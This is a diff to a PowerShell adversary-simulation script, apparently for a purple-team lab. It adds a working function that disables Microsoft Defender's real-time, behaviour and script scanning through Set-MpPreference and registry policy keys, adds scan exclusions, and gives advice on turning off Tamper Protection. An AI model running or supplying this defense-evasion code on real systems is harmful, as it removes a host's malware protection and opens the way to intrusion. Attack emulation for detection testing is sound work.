@@ -71,6 +71,69 @@ function Initialize-SimulationEnvironment {
     }
 }
 
+function Disable-DefenderForSimulation {
+    <#
+        Disables Microsoft Defender real-time protection for the duration of the
+        simulation so that the attack chain detonates deterministically and the
+        intended artifacts are left behind for the analyst (real intrusions do the
+        same - this is authentic defense-evasion behavior, MITRE T1562.001 Impair
+        Defenses: Disable or Modify Tools).
+
+        LAB-ONLY. This makes real, system-wide security changes. It is gated behind
+        Confirm-Execution and assumes the isolated, disposable snapshot VM the rest
+        of the simulation requires.
+
+        On modern Windows, Tamper Protection blocks Set-MpPreference / registry
+        edits; if so, the individual calls fail closed and we log that Defender is
+        still active. To make this reliable, turn Tamper Protection OFF once in the
+        VM image (Windows Security -> Virus & threat protection -> Manage settings)
+        and snapshot - then this function fully disables Defender each run.
+    #>
+    param([switch]$AddExclusions)
+
+    Write-Host "[*] Disabling Microsoft Defender for the simulation (lab-only, T1562.001) ..." -ForegroundColor Magenta
+
+    # 1) Preferred path: Set-MpPreference (blocked if Tamper Protection is on)
+    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
+
+    # 2) Registry policy fallback (also Tamper-Protection-gated on modern builds)
+    try {
+        $rt = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+        New-Item -Path $rt -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $rt -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $rt -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+        $dp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+        New-Item -Path $dp -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $dp -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    # 3) Optionally exclude the sim root so any surviving scanner ignores it
+    if ($AddExclusions) {
+        try { Add-MpPreference -ExclusionPath "$env:SystemDrive\LunarSpiderSim" -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionPath "$env:ALLUSERSPROFILE" -ErrorAction SilentlyContinue } catch {}
+    }
+
+    # Report resulting state so the run log shows whether it took effect
+    try {
+        $st = Get-MpComputerStatus -ErrorAction Stop
+        Write-Host ("    RealTimeProtection now: {0}  (Tamper Protection: {1})" -f `
+            $st.RealTimeProtectionEnabled, $st.IsTamperProtected) -ForegroundColor DarkGray
+        if ($st.RealTimeProtectionEnabled) {
+            Write-Host "    [!] Defender still active - Tamper Protection likely ON. Disable it once in the VM image and snapshot for a deterministic run." -ForegroundColor Yellow
+        } else {
+            Write-Host "    [OK] Defender real-time protection disabled." -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "    Defender status query unavailable (Defender may be absent on this VM)." -ForegroundColor DarkGray
+    }
+    Write-SimEvent -EventId 1000 -Message "SIMULATION: attempted to disable Microsoft Defender (T1562.001) at simulation start"
+}
+
 # Real threat-actor infrastructure from the DFIR Report - used for outbound
 # connection attempts only, to generate authentic DNS/network telemetry.
 # Connections will typically fail closed (sinkholed/offline) - that is expected
